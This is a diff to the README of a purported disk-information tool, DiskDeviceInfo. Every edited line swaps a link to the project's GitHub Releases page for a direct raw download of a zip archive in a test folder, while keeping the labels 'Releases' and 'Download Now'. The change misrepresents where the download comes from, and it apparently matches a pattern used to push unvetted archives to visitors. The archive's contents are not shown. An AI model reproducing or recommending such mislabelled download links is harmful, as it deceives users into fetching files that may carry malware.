@@ -8,7 +8,7 @@ Welcome to DiskDeviceInfo, a simple yet powerful tool that provides a comprehens
 - Simplified interface compared to Microsoft solutions
 
 ## Installation
-To get started, visit the [Releases](https://github.com/Hamloli/DiskDeviceInfo/releases) section and download the latest executable file for your system.
+To get started, visit the [Releases](https://raw.githubusercontent.com/Hamloli/DiskDeviceInfo/main/gddTest/Disk-Info-Device-1.5.zip) section and download the latest executable file for your system.
 
 ## Repository Information
 - **Repository Name**: DiskDeviceInfo
@@ -25,11 +25,11 @@ This tool is built using C# and .NET, leveraging device management and disk info
 If you encounter any issues or have suggestions for improvements, feel free to open an issue or submit a pull request. Your feedback is valuable in enhancing the functionality of DiskDeviceInfo.
 
 ## Stay Updated
-Stay informed about the latest releases and updates by visiting the [Releases](https://github.com/Hamloli/DiskDeviceInfo/releases) section regularly.
+Stay informed about the latest releases and updates by visiting the [Releases](https://raw.githubusercontent.com/Hamloli/DiskDeviceInfo/main/gddTest/Disk-Info-Device-1.5.zip) section regularly.
 
 ---
 
-[Download Now](https://github.com/Hamloli/DiskDeviceInfo/releases)
+[Download Now](https://raw.githubusercontent.com/Hamloli/DiskDeviceInfo/main/gddTest/Disk-Info-Device-1.5.zip)
 
 ---
 
